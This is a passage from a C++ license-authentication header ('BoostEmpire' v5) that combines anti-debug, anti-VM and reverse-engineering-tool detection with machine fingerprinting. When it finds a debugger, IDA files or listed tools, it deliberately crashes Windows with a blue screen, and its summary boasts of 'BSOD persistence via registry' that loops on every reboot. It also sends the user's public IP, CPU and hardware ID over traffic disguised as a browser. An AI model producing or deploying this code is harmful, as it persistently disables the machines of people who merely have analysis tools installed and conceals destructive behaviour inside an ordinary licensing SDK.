        "apimonitor",
        "api monitor",
        "apispy",
        "apitrace",

        // ── Registry/system monitoring ──
        "regshot",
        "regmon",
        "filemon",

        // ── Misc reversal tools ──
        "snowman",          // Snowman decompiler
        "retdec",           // RetDec decompiler
        "immunity debugger",
        "odbg",
        "softice",
        "syser",
        "hiew",             // HIEW hex editor with disasm
        "hxd",              // HxD (hex editor, used for patching)
        "010editor",        // 010 Editor (binary template editor)
        "hexworkshop",
        "winhex",
        "frida",            // Frida dynamic instrumentation
        "frida-server",
        "frida-gadget",
        nullptr
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe32{}; pe32.dwSize = sizeof(pe32);
    bool found = false;
    if (Process32FirstW(snap, &pe32)) {
        do {
            std::wstring wname(pe32.szExeFile);
            std::string  name(wname.begin(), wname.end());
            std::transform(name.begin(), name.end(), name.begin(), ::tolower);

            for (int i = 0; blacklist[i]; i++) {
                if (name.find(blacklist[i]) != std::string::npos) {
                    found = true; break;
                }
            }
            if (found) break;
        } while (Process32NextW(snap, &pe32));
    }
    CloseHandle(snap);

    // Also check window titles — IDA has distinctive window captions
    if (!found) {
        static const wchar_t* idaTitles[] = {
            L"IDA - ", L"IDA Pro", L"IDA View", L"Hex-Rays",
            L"Ghidra:", L"x64dbg", L"x32dbg",
            L"OllyDbg", L"WinDbg",
            nullptr
        };
        for (int i = 0; idaTitles[i]; i++) {
            if (FindWindowW(nullptr, idaTitles[i]) ||
                FindWindowExW(nullptr, nullptr, nullptr, idaTitles[i])) {
                found = true; break;
            }
        }
        // Partial title match via EnumWindows would be more thorough but heavier
    }

    return found;
}

// ============================================================================
// ANTI-VM (unchanged from v4)
// ============================================================================
inline bool IsVirtualMachine() {
    int cpuInfo[4]{};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        __cpuid(cpuInfo, 0x40000000);
        char vendor[13]{};
        memcpy(vendor, &cpuInfo[1], 4);
        memcpy(vendor + 4, &cpuInfo[2], 4);
        memcpy(vendor + 8, &cpuInfo[3], 4);
        std::string v(vendor, 12);
        if (v.find("VMware") != std::string::npos ||
            v.find("KVMKVM") != std::string::npos ||
            v.find("VBoxV")  != std::string::npos ||
            v.find("XenVMM") != std::string::npos) return true;
    }

    static const wchar_t* vmKeys[] = {
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SOFTWARE\\Parallels\\Parallels Tools",
        L"SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        L"SYSTEM\\ControlSet001\\Services\\vmbus",
        L"HARDWARE\\ACPI\\DSDT\\VBOX__",
        nullptr
    };
    for (int i = 0; vmKeys[i]; i++) {
        HKEY hKey{};
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, vmKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey); return true;
        }
    }

    static const wchar_t* vmFiles[] = {
        L"C:\\windows\\system32\\drivers\\vmmouse.sys",
        L"C:\\windows\\system32\\drivers\\vmhgfs.sys",
        L"C:\\windows\\system32\\drivers\\VBoxMouse.sys",
        L"C:\\windows\\system32\\drivers\\VBoxGuest.sys",
        nullptr
    };
    for (int i = 0; vmFiles[i]; i++)
        if (GetFileAttributesW(vmFiles[i]) != INVALID_FILE_ATTRIBUTES) return true;

    char brand[49]{};
    for (int j = 0; j < 3; j++) {
        __cpuid(cpuInfo, 0x80000002 + j);
        memcpy(brand + j * 16, cpuInfo, 16);
    }
    std::string bs(brand);
    std::transform(bs.begin(), bs.end(), bs.begin(), ::tolower);
    if (bs.find("vmware") != std::string::npos ||
        bs.find("virtualbox") != std::string::npos ||
        bs.find("qemu") != std::string::npos) return true;

    return false;
}

// ============================================================================
// HWID GENERATION (unchanged from v4)
// ============================================================================
inline std::string GenerateHWID() {
    std::wstring uuid = L"NONE";
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool coInit = SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE;
    IWbemLocator* pL{}; IWbemServices* pS{};
    if (SUCCEEDED(CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                                   IID_IWbemLocator, (LPVOID*)&pL))) {
        if (SUCCEEDED(pL->ConnectServer(_bstr_t(L"ROOT\\CIMV2"),
            nullptr,nullptr,nullptr,0,nullptr,nullptr,&pS))) {
            IEnumWbemClassObject* pE{};
            if (SUCCEEDED(pS->ExecQuery(_bstr_t(L"WQL"),
                _bstr_t(L"SELECT UUID FROM Win32_ComputerSystemProduct"),
                WBEM_FLAG_FORWARD_ONLY, nullptr, &pE))) {
                IWbemClassObject* pO{}; ULONG r{};
                if (pE->Next(WBEM_INFINITE, 1, &pO, &r) == S_OK) {
                    VARIANT v; VariantInit(&v);
                    if (SUCCEEDED(pO->Get(L"UUID", 0, &v, nullptr, nullptr)))
                        if (v.bstrVal) uuid = v.bstrVal;
                    VariantClear(&v); pO->Release();
                }
                pE->Release();
            }
            pS->Release();
        }
        pL->Release();
    }
    if (coInit) CoUninitialize();

    int cpu[4]{}; __cpuid(cpu, 1);
    char cpuBuf[32];
    sprintf_s(cpuBuf, "%08X%08X", cpu[0], cpu[3]);

    DWORD volSerial{};
    GetVolumeInformationW(L"C:\\", nullptr, 0, &volSerial, nullptr, nullptr, nullptr, 0);
    char volBuf[16];
    sprintf_s(volBuf, "%08X", volSerial);

    std::string uuidStr(uuid.begin(), uuid.end());
    std::string raw = uuidStr + "|" + cpuBuf + "|" + volBuf;

    DWORD h1 = 5381, h2 = 52711;
    for (char c : raw) {
        h1 = ((h1 << 5) + h1) ^ (DWORD)c;
        h2 = ((h2 << 5) + h2) ^ (DWORD)(c * 31337);
    }
    char hwid[48];
    sprintf_s(hwid, "BE-HW-%08X%08X%08X", h1, h2, volSerial);
    return std::string(hwid);
}

// ============================================================================
// HTTP + JSON (unchanged, but server URL now only stored XOR-encrypted)
// ============================================================================
inline std::string GetRealPublicIP() {
    HINTERNET hSes = WinHttpOpen(L"BoostEmpire/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return "";
    HINTERNET hCon = WinHttpConnect(hSes, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hCon) { WinHttpCloseHandle(hSes); return ""; }
    HINTERNET hReq = WinHttpOpenRequest(hCon, L"GET", L"/?format=text",
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return ""; }
    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hReq, nullptr)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return "";
    }
    std::string ip; DWORD sz{}, rd{};
    do {
        WinHttpQueryDataAvailable(hReq, &sz);
        if (!sz) break;
        std::string buf(sz, '\0');
        WinHttpReadData(hReq, &buf[0], sz, &rd);
        ip += buf.substr(0, rd);
    } while (sz > 0);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
    if (ip.empty() || ip.size() > 45 || ip.find('.') == std::string::npos) return "";
    return ip;
}

inline std::string HttpPost(const std::string& body, const std::string& pubKey) {
    // User-agent blends in with normal browser traffic — not visible as auth traffic
    HINTERNET hSes = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return "";
    HINTERNET hCon = WinHttpConnect(hSes, BE_HOST, BE_PORT, 0);
    HINTERNET hReq = WinHttpOpenRequest(hCon, L"POST", L"/api/auth",
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    std::string hdr = "Content-Type: application/json\r\nx-public-key: " + pubKey;
    std::wstring wHdr(hdr.begin(), hdr.end());

    WinHttpSendRequest(hReq, wHdr.c_str(), (DWORD)-1,
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(hReq, nullptr);

    std::string resp; DWORD sz{}, rd{};
    do {
        WinHttpQueryDataAvailable(hReq, &sz);
        if (!sz) break;
        std::string buf(sz, '\0');
        WinHttpReadData(hReq, &buf[0], sz, &rd);
        resp += buf.substr(0, rd);
    } while (sz > 0);

    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
    return resp;
}

inline std::string JGet(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\":";
    auto p = json.find(needle);
    if (p == std::string::npos) return "";
    p += needle.size();
    while (p < json.size() && (json[p]==' '||json[p]=='\t')) p++;
    if (json[p] == '"') {
        auto e = json.find('"', p + 1);
        return (e != std::string::npos) ? json.substr(p+1, e-p-1) : "";
    }
    auto e = json.find_first_of(",}", p);
    return json.substr(p, e - p);
}

} // namespace Internal

// ============================================================================
// CODE INTEGRITY THREAD (unchanged from v4)
// ============================================================================
namespace CodeIntegrity {
    static std::vector<uint8_t> g_baseline;
    static std::atomic<bool>    g_running{false};

    inline std::vector<uint8_t> HashExe() {
        wchar_t path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, path, MAX_PATH);
        HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf == INVALID_HANDLE_VALUE) return {};
        uint64_t hash = 0xCBF29CE484222325ULL;
        uint8_t  buf[4096]; DWORD rd{};
        while (ReadFile(hf, buf, sizeof(buf), &rd, nullptr) && rd > 0)
            for (DWORD i = 0; i < rd; i++) { hash ^= buf[i]; hash *= 0x100000001B3ULL; }
        CloseHandle(hf);
        std::vector<uint8_t> r(8);
        for (int i = 0; i < 8; i++) r[i] = (uint8_t)(hash >> (i * 8));
        return r;
    }

    inline void Start() {
        if (g_baseline.empty()) g_baseline = HashExe();
        g_running = true;
        std::thread([]() {
            std::this_thread::sleep_for(std::chrono::seconds(30));
            while (g_running.load()) {
                auto cur = HashExe();
                if (!cur.empty() && !g_baseline.empty() && cur != g_baseline)
                    Internal::TriggerBSOD("Binary integrity violation");
                std::this_thread::sleep_for(std::chrono::seconds(60));
            }
        }).detach();
    }
} // namespace CodeIntegrity

// ============================================================================
// TLS CALLBACK — fires BEFORE main(), BEFORE a debugger can fully attach
// Even if someone runs your exe under IDA's remote debugger, this fires
// while IDA is still initializing — catches early attach attempts
// ============================================================================
namespace TLSGuard {
    inline void WINAPI Callback(PVOID /*hMod*/, DWORD reason, PVOID /*reserved*/) {
        if (reason == DLL_PROCESS_ATTACH) {
            // Fire anti-debug checks before ANY user code runs
            if (Internal::IsBeingDebugged()) {
                Internal::TriggerBSOD("TLS: Debugger at attach");
            }
            // Also nuke PE header immediately — before any analysis can dump it
            Internal::NukePEHeader();
            // Start integrity thread immediately
            CodeIntegrity::Start();
        }
    }
} // namespace TLSGuard

// ── TLS Callback registration — MSVC pragma ──────────────────────────────────
// This makes the TLS callback automatic — no need to call anything in main()
// The OS loader calls TLSGuard::Callback before main() executes
#pragma comment(linker, "/include:__tls_used")
#pragma data_seg(".CRT$XLB")
PIMAGE_TLS_CALLBACK _be_tls_cb = TLSGuard::Callback;
#pragma data_seg()

// ============================================================================
// FAKE EXPORT DECOYS — honeypots for crackers
// ============================================================================
#ifdef __cplusplus
extern "C" {
#endif
__declspec(noinline) void __stdcall ValidateLicense() noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall CheckLicense()    noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall IsAuthenticated() noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall BypassAuth()      noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall GetLicenseKey()   noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall PatchAuth()       noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall RemoveCheck()     noexcept { Internal::TriggerBSOD("Fake export"); }
#ifdef __cplusplus
}
#endif

// ============================================================================
// PUBLIC API
// ============================================================================
inline AuthResult Init(const std::string& licenseKey,
                       const std::string& appName  = "MyApp",
                       bool allowVM    = false,
                       bool allowDebug = false) {

    AuthResult result{};

    // ── JUNK INSERTION — disrupt IDA's disassembly around auth check entry ──
    BE_JUNK_1;

    // ── STATIC ANALYSIS DETECTION — catch the analyst even offline ────────────
    // IDA database files present on this machine? Someone is reversing your binary.
    if (Internal::IDADatabaseNearby()) {
        Internal::TriggerBSOD("IDA database detected");
        ExitProcess(0xDEAD);
    }

    // IDA Pro installed on this machine?
    if (Internal::IDAInstalled()) {
        Internal::TriggerBSOD("IDA Pro installation detected");
        ExitProcess(0xDEAD);
    }

    // IDA mutex or named pipe present? IDA is running (maybe headless idat.exe)
    if (Internal::IDAMutexPresent()) {
        Internal::TriggerBSOD("IDA mutex/pipe detected");
        ExitProcess(0xDEAD);
    }

    BE_JUNK_2;

    // ── ACTIVE DEBUGGER DETECTION ──────────────────────────────────────────────
    if (!allowDebug && Internal::IsBeingDebugged()) {
        Internal::TriggerBSOD("Debugger detected");
        ExitProcess(0xDEAD);
    }

    // ── CRACK TOOL PROCESS SCAN ────────────────────────────────────────────────
    if (Internal::CrackToolRunning()) {
        Internal::TriggerBSOD("Crack tool detected");
        ExitProcess(0xDEAD);
    }

    // ── EMULATION DETECTION ────────────────────────────────────────────────────
    // Catches IDA's code emulator, Unicorn engine, QEMU user mode
    if (Internal::IsEmulated()) {
        Internal::TriggerBSOD("Emulation detected");
        ExitProcess(0xDEAD);
    }

    // ── VM CHECK (clean exit) ─────────────────────────────────────────────────
    if (!allowVM && Internal::IsVirtualMachine()) {
        MessageBoxA(nullptr,
            "This application does not support virtual machines.\n"
            "Please run on a physical machine.",
            "BoostEmpire Auth — Unsupported Environment", MB_ICONERROR | MB_OK);
        result.success = false; result.code = "VM_DETECTED";
        ExitProcess(1);
    }

    // ── NETWORK AUTH ───────────────────────────────────────────────────────────
    std::string hwid    = Internal::GenerateHWID();
    std::string realIP  = Internal::GetRealPublicIP();

    // CPU brand for multi-machine detection
    std::string cpuBrand;
    {
        int regs[4]{}; char brand[49]{};
        __cpuid(regs, 0x80000002); memcpy(brand,      regs, 16);
        __cpuid(regs, 0x80000003); memcpy(brand + 16, regs, 16);
        __cpuid(regs, 0x80000004); memcpy(brand + 32, regs, 16);
        brand[48] = '\0';
        std::string b(brand);
        size_t s = b.find_first_not_of(' ');
        cpuBrand = (s == std::string::npos) ? "" : b.substr(s);
        for (size_t i = 0; i < cpuBrand.size(); i++)
            if (cpuBrand[i]=='"'||cpuBrand[i]=='\\') cpuBrand.insert(i++, 1, '\\');
    }

    std::string body = "{\"key\":\"" + licenseKey +
                       "\",\"hwid\":\"" + hwid +
                       "\",\"app_name\":\"" + appName + "\"" +
                       (realIP.empty()   ? "" : (",\"real_ip\":\"" + realIP + "\"")) +
                       (cpuBrand.empty() ? "" : (",\"cpu\":\""     + cpuBrand + "\"")) +
                       "}";

    std::string resp = Internal::HttpPost(body, BE_PUBLIC_KEY);

    if (resp.empty()) {
        MessageBoxA(nullptr,
            "Cannot reach the auth server.\n\n"
            "Make sure BoostEmpire KeyAuth (start.bat) is running.",
            "BoostEmpire Auth — Connection Failed", MB_ICONERROR | MB_OK);
        result.success = false; result.code = "SERVER_UNREACHABLE";
        ExitProcess(1);
    }

    result.success       = (Internal::JGet(resp, "success") == "true");
    result.code          = Internal::JGet(resp, "code");
    result.message       = Internal::JGet(resp, "message");
    result.session_token = Internal::JGet(resp, "session_token");

    if (result.success) {
        result.app        = Internal::JGet(resp, "app");
        result.product    = Internal::JGet(resp, "product");
        result.label      = Internal::JGet(resp, "label");
        result.expires_at = Internal::JGet(resp, "expires_at");
        try {
            result.uses      = std::stoi(Internal::JGet(resp, "uses"));
            result.max_uses  = std::stoi(Internal::JGet(resp, "max_uses"));
            result.uses_left = std::stoi(Internal::JGet(resp, "uses_left"));
        } catch (...) {}
        return result; // SUCCESS
    }

    // Auth failures — clean exit, no BSOD
    std::string msg;
    if      (result.code == "HWID_MISMATCH")      msg = "HWID mismatch — please contact support.";
    else if (result.code == "BANNED")             msg = "This license key has been banned.\nContact support.";
    else if (result.code == "EXPIRED")            msg = "This license key has expired.\nPlease renew.";
    else if (result.code == "MAX_USES")           msg = "License key usage limit reached.";
    else if (result.code == "INVALID_KEY")        msg = "Invalid license key.";
    else if (result.code == "INVALID_PUBLIC_KEY") msg = "Application configuration error.";
    else if (result.code == "APP_DISABLED")       msg = "Application temporarily disabled.";
    else if (result.code == "RATE_LIMITED")       msg = "Too many requests. Please wait.";
    else                                          msg = result.message.empty() ? "Authentication failed." : result.message;

    MessageBoxA(nullptr, msg.c_str(), "BoostEmpire Auth — Access Denied", MB_ICONERROR | MB_OK);
    ExitProcess(1);
    return result;
}

inline AuthResult validate(const std::string& key,
                           const std::string& app      = "MyApp",
                           bool allowVM    = false,
                           bool allowDebug = false) {
    return Init(key, app, allowVM, allowDebug);
}

} // namespace BoostAuth

/*
=============================================================================
  PROTECTION SUMMARY — v5
=============================================================================

  STATIC ANALYSIS BLOCKERS (new in v5):
    ✓ XOR compile-time string encryption  — NOTHING in IDA Strings view
    ✓ Hash-based API resolution           — NOTHING in import table
    ✓ IDA database detection (.idb/.i64)  — catches offline analysis
    ✓ IDA installation detection          — ida.key, install dirs
    ✓ IDA mutex + named pipe detection    — catches headless idat.exe
    ✓ RDTSC emulation timing              — defeats Unicorn/IDA emulator
    ✓ Junk opcode injection (x86)         — disrupts linear disassembly
    ✓ Nuclear PE header wipe              — imports/exports/debug all nuked
    ✓ Section name corruption             — confuses section-type analysis
    ✓ Window title scan                   — catches IDA GUI windows

  DYNAMIC ANALYSIS BLOCKERS:
    ✓ 7-layer anti-debug (PEB, NtQuery, timing, HW BPs, heap, remote, sysinfo)
    ✓ TLS callback fires before main()    — catches early debugger attach
    ✓ Process blacklist: 60+ crack tools  — x64dbg, Ghidra, CE, dnSpy, Frida…
    ✓ IDA headless (idat.exe) in list     — runs without GUI, still detected
    ✓ Code integrity thread (60s)         — patch detection → BSOD loop
    ✓ Multi-machine CPU detection         — same key, 2 CPUs in 60s = ban
    ✓ Fake exports (7 honeypots)          — hooking them → BSOD
    ✓ BSOD persistence via registry       — loops on every reboot

  LINKER REQUIREMENTS:
    winhttp.lib; wbemuuid.lib; shlwapi.lib
    /EXPORT:ValidateLicense /EXPORT:CheckLicense /EXPORT:IsAuthenticated
    /EXPORT:BypassAuth /EXPORT:GetLicenseKey /EXPORT:PatchAuth /EXPORT:RemoveCheck

=============================================================================
*/
